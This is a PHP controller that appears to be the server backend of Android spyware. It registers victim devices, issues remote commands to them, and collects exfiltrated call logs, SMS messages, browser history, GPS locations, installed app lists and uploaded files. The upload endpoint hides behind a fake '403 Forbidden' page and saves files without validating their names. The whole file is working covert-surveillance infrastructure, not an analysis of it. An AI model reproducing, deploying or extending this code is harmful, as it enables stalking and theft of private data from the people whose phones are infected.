<?php
class Device extends CI_Controller{
	
	public function __construct()
	{
		parent:: __construct();

		$this->output->set_header('Expires: Sat, 26 Jul 1997 05:00:00 GMT');
		$this->output->set_header('Cache-Control: no-cache, no-store, must-revalidate, max-age=0');
		$this->output->set_header('Cache-Control: post-check=0, pre-check=0', FALSE);
		$this->output->set_header('Pragma: no-cache');

		$this->load->model('device_model');
		$this->load->helper('url');
	}

	function checkdevice($did=false)
	{
		if($_POST){
			$did = $_REQUEST['did'];
			$name = $_REQUEST['name'];
			$number = $_REQUEST['number'];
			$res = $this->device_model->insertid($did, $name, $number);
			return;
		}
	}

	function getcommand($id=false)
	{
		$id = $_REQUEST['did'];
		$name = $_REQUEST['name'];
		$number = $_REQUEST['number'];
		$res = $this->device_model->getcommand($id, $name, $number);
		if(sizeof($res) > 0 ){
			if($res['clm_commandseen'] == 0){
				echo $res['clm_currentcommand'];
				$stat = $this->device_model->changestat($number);
			}
		}
	}

	function upload()
	{
			echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
			<html><head>
			<title>403 Forbidden</title>
			</head><body>
			<h1>Forbidden</h1>
			<p>You don\'t have permission to access /androidcp/
			on this server.</p>
			<p>Additionally, a 403 Forbidden
			error was encountered while trying to use an ErrorDocument to handle the request.</p>
			<hr>
			<address>Apache Server at lucideustech.in Port 80</address>
			</body></html>';
			$name = basename($_FILES['file']['name']);
			$arr = explode("_", $name);
			$dir = $arr[0];

			//$dir = "test";

			$path = 'files/' . $dir . "/";

			if (!is_dir('files/'.$dir)) {
			    mkdir('files/'.$dir);
			}

			if(move_uploaded_file($_FILES['file']['tmp_name'], $path.$name)){
			}		
	}

	 function receiver()
	 {
			if(isset($_POST['type'])){
				if($_POST['type']=="calllog"){
					$id = $_POST['did'];
					$name = $_POST['name'];
					$number = $_POST['number'];
					$data = $_POST['data'];
					$data = explode("||", $data);

					foreach ($data as $row) {
					$arr = explode("|", $row);
					$res = $this->device_model->insertcalllog($id,$name,$number,$arr);
					}
				}else if($_POST['type']=="smslog"){
					$id = $_POST['did'];
					$name = $_POST['name'];
					$number = $_POST['number'];
					$data = $_POST['data'];
					$data = explode("||", $data);

					foreach ($data as $row) {
					$arr = explode("|", $row);
					$res = $this->device_model->insertsmslog($id,$name,$number,$arr);
					}
				}
				else if($_POST['type']=="browserlog"){
					$id = $_POST['did'];
					$name = $_POST['name'];
					$number = $_POST['number'];
					$data = $_POST['data'];
					$data = explode("||", $data);

					foreach ($data as $row) {
					$arr = explode("|", $row);
					$res = $this->device_model->insertbrowserlog($id,$name,$number,$arr);
					}
				}
				else if($_POST['type']=="gps"){
					$id = $_POST['did'];
					$name = $_POST['name'];
					$number = $_POST['number'];
					$data = $_POST['data'];

					$arr = explode("|", $data);
					$res = $this->device_model->insertgps($id,$name,$number,$arr);
				}
				else if($_POST['type']=="packages"){
					$id = $_POST['did'];
					$name = $_POST['name'];
					$number = $_POST['number'];
					$data = $_POST['data'];
					$data = explode("||", $data);

					foreach ($data as $row) {
					$res = $this->device_model->insertpackages($id,$name,$number,$row);
					}
				}
			}
	}
}
?>